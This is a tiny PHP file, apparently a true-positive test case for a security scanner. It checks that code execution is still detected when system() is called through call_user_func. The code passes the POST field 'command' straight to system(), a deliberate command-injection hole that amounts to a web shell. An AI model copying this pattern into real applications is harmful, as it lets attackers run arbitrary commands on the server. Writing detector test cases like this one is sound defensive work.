<?php
// TP: Dynamic dispatch to system() remains command execution.
$command = $_POST['command'];
call_user_func('system', $command);
